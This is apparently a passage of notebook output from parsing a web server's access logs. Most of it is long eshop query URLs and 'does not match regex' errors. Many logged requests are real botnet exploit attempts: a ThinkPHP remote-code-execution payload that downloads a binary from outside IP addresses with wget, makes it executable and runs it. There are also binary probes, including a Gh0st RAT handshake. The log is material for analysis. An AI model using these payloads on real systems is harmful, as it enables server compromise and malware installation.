%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[88510,%2090111,%2092944,%20121366,%20121446,%20124092,%20130052,%20257155,%20319972,%20320568,%20341312,%20347500,%20387843,%20413773,%20421310,%20421462,%20425250,%20445328,%20504509,%20504510,%20509896,%20513117,%20513613,%20516806,%20518672,%20529249,%20550946,%20553838,%20564459,%20564482,%20564505,%20568654,%20568686,%20568709,%20568733,%20568757,%20568785,%20568808,%20569422,%20569445,%20576760,%20590017,%20592895,%20616123,%20645832,%20727654,%20741325,%20774325,%20774540,%20775973,%20785148,%20790007,%20790050,%20790093,%20790136,%20790179,%20790222,%20790265,%20790308,%20790351,%20790394,%20790437,%20790480,%20790523,%20790566,%20803147,%20815335,%20817410,%20824261,%20824262,%20849125,%20849413,%20849455,%20849496,%20849536,%20849575,%20849613,%20849650,%20849686,%20849721,%20849755,%20849788,%20849820,%20896020,%20924813,%20952339,%20952367,%20952395,%20952423,%20952451,%20952479,%20965167,%20980115,%20989118,%20989125,%201019363,%201021710,%201023616,%201024837,%201024917,%201028277,%201045742,%201053292,%201058499,%201058603,%201072508,%201082755,%201082843,%201089360,%201095251,%201109859,%201133106,%201159321,%201159616,%201159689,%201163551,%201163624,%201163698,%201163771,%201163843,%201163913,%201166793,%201166862,%201166931,%201167143,%201185124,%201191706,%201204943,%201220745,%201229475,%201234154,%201239180,%201254328,%201310665,%201318685,%201318866,%201318869,%201319331,%201341077,%201342259,%201349733,%201375595,%201410807,%201422061,%201430180,%201436511,%201438435,%201439336,%201439484,%201442351,%201444123,%201459962,%201460279,%201472352,%201472670,%201476319,%201476348,%201476377,%201476407,%201476835,%201476888,%201476917,%201480938,%201487157,%201489097,%201495473,%201509217,%201512877,%201512886,%201512897,%201512911,%201512926,%201512943,%201512963,%201512985,%201513008,%201513034,%201513062,%201513090,%201513120,%201513149,%201513842,%201513874,%201520644,%201523425,%201524024,%201524051,%201524052,%201530700,%201530718,%201539844,%201545908,%201564704,%201564745,%201565899,%201570357,%201570418,%201574436,%201579448,%201589699,%201594691,%201596664,%201601882,%201620684,%201656976,%201688033,%201702050,%201713360,%201732681,%201743714,%201763346,%201779832,%201785697,%201800631,%201800670,%201817045,%201818196,%201818223,%201818250,%201818284,%201818315,%201818316,%201818348,%201818379,%201818410,%201818450,%201818482,%201818522,%201818554,%201818585,%201824077,%201835567,%201836727,%201836755,%201837933,%201837983,%201838803,%201848063,%201850593,%201851102,%201853977,%201854067,%201854991,%201855053,%201855170,%201856037,%201856625,%201856880,%201856962,%201856974,%201857003,%201857191,%201859427,%201859428,%201863619,%201868735,%201871516,%201871544,%201873427,%201873544,%201873606,%201875938,%201875999,%201876060,%201876121,%201876182,%201876455,%201877519,%201877581,%201877582,%201879447,%201880307,%201882561,%201882641,%201882649,%201882651,%201883595,%201889476,%201893353,%201894172,%201902553,%201903836,%201909254,%201921090,%201921163,%201921273,%201930633,%201944604,%201954313,%201968157,%201970363,%201970676,%201973196,%2088511,%20121367,%20121445,%20124093,%20130053,%20257156,%20301334,%20305696,%20319973,%20320569,%20347501,%20387844,%20413774,%20421311,%20421463,%20425251,%20445329,%20504511,%20504512,%20509897,%20513118,%20513614,%20516807,%20518673,%20529250,%20550947,%20553839,%20564460,%20564483,%20564506,%20568655,%20568687,%20568710,%20568734,%20568758,%20568786,%20568809,%20569423,%20569446,%20576761,%20590018,%20592896,%20616124,%20645833,%20727655,%20741326,%20774326,%20774541,%20775974,%20785149,%20790008,%20790051,%20790094,%20790137,%20790180,%20790223,%20790266,%20790309,%20790352,%20790395,%20790438,%20790481,%20790524,%20790567,%20803148,%20815336,%20817411,%20824263,%20824264,%20849126,%20849414,%20849456,%20849497,%20849537,%20849576,%20849614,%20849651,%20849687,%20849722,%20849756,%20849789,%20849821,%20896021,%20924814,%20952340,%20952368,%20952396,%20952424,%20952452,%20952480,%20965168,%20980116,%20989119,%20989126,%20989828,%20994026,%201021711,%201022006,%201024838,%201024918,%201045743,%201053293,%201058500,%201058604,%201072509,%201082756,%201082844,%201089361,%201095252,%201109860,%201133107,%201159322,%201159617,%201159690,%201163552,%201163625,%201163699,%201163772,%201163844,%201163914,%201166794,%201166863,%201166932,%201167144,%201185125,%201185184,%201191707,%201220746,%201229476,%201234155,%201239181,%201254329,%201310666,%201318686,%201341078,%201342260,%201349734,%201375597,%201410809,%201422063,%201430182,%201436513,%201438437,%201439338,%201439486,%201442353,%201444125,%201459964,%201460281,%201472354,%201472672,%201476321,%201476350,%201476379,%201476409,%201476837,%201476890,%201476919,%201480940,%201487159,%201489099,%201495475,%201509219,%201512879,%201512888,%201512899,%201512913,%201512928,%201512945,%201512965,%201512987,%201513010,%201513036,%201513064,%201513092,%201513122,%201513151,%201513844,%201513876,%201520646,%201523427,%201524026,%201524054,%201524055,%201524081,%201524107,%201524108,%201524134,%201524159,%201524160,%201524186,%201524211,%201524212,%201524238,%201524240,%201530702,%201530722,%201539846,%201545910,%201564706,%201564747,%201565901,%201570359,%201570420,%201574438,%201579450,%201589701,%201594693,%201596666,%201601884,%201620686,%201656978,%201688039,%201702052,%201713362,%201732683,%201743716,%201763348,%201\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] \"\\x00\\x85\\x07\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] \"\\x05bE\\x00\\x05b\\x00\\x00@\\x00;\\x11\\x0F\\xAC\\xD8:\\xC2\\xD6\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 124.5.72.114 - - [22/Jan/2019:18:46:45 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.118.70.118 - - [22/Jan/2019:19:17:55 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 149.12.217.166 - - [22/Jan/2019:19:20:15 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.72 - - [22/Jan/2019:19:31:13 +0330] \"E\\x00\\x00I\\xCD{\\x00\\x00@\\x11\\xF5Q\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.112.163.67 - - [22/Jan/2019:20:31:15 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 85.59.177.246 - - [22/Jan/2019:20:52:36 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.68.245.69 - - [22/Jan/2019:20:58:08 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 178.47.102.135 - - [22/Jan/2019:21:52:00 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.188.210.12 - - [22/Jan/2019:23:05:04 +0330] \"\\x05\\x01\\x00\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.188.210.12 - - [22/Jan/2019:23:06:22 +0330] \"\\x04\\x01\\x00P\\x05\\xBC\\xD2\\x0C\\x00\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.93.73.169 - - [23/Jan/2019:00:29:50 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 65.127.187.7 - - [23/Jan/2019:00:36:07 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 103.2.64.231 - - [23/Jan/2019:00:59:05 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 182.170.139.97 - - [23/Jan/2019:01:01:53 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 120.28.151.44 - - [23/Jan/2019:01:58:17 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 66.240.205.34 - - [23/Jan/2019:03:09:34 +0330] \"Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``\\x98\\xC3\\xC0\\xC0\\xC0\\x06\\xC4\\x8C@\\xBCQ\\x96\\x81\\x81\\x09H\\x07\\xA7\\x16\\x95e&\\xA7*\\x04$&g+\\x182\\x94\\xF6\\xB000\\xAC\\xA8rc\\x00\\x01\\x11\\xA0\\x82\\x1F\\x5C`&\\x83\\xC7K7\\x86\\x19\\xE5n\\x0C9\\x95n\\x0C;\\x84\\x0F3\\xAC\\xE8sch\\xA8^\\xCF4'J\\x97\\xA9\\x82\\xE30\\xC3\\x91h]&\\x90\\xF8\\xCE\\x97S\\xCBA4L?2=\\xE1\\xC4\\x92\\x86\\x0B@\\xF5`\\x0CT\\x1F\\xAE\\xAF]\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 98.206.114.40 - - [23/Jan/2019:03:36:16 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 98.206.114.40 - - [23/Jan/2019:03:36:20 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 98.206.114.40 - - [23/Jan/2019:03:36:25 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 66.160.199.78 - - [23/Jan/2019:03:52:09 +0330] \"E\\x00\\x00J\\x11,@\\x00@\\x11\\x7F\\xA1\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 103.213.27.147 - - [23/Jan/2019:04:18:19 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 194.113.106.124 - - [23/Jan/2019:05:21:53 +0330] \"\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 93.127.52.4 - - [23/Jan/2019:06:06:13 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.148.174.153 - - [23/Jan/2019:06:31:57 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 223.197.212.15 - - [23/Jan/2019:07:06:40 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 192.99.203.185 - - [23/Jan/2019:07:23:16 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86' HTTP/1.1\" 400 166 \"-\" \"Damien/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 117.102.69.124 - - [23/Jan/2019:07:33:18 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 61.121.238.84 - - [23/Jan/2019:07:33:48 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.68.245.69 - - [23/Jan/2019:07:43:57 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 193.86.156.188 - - [23/Jan/2019:08:05:12 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 193.86.156.188 - - [23/Jan/2019:08:05:29 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 80.211.175.115 - - [23/Jan/2019:08:20:06 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 36.66.16.117 - - [23/Jan/2019:08:20:38 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 120.224.101.134 - - [23/Jan/2019:09:24:38 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 196.46.202.80 - - [23/Jan/2019:09:27:16 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.117.116.238 - - [23/Jan/2019:09:27:27 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
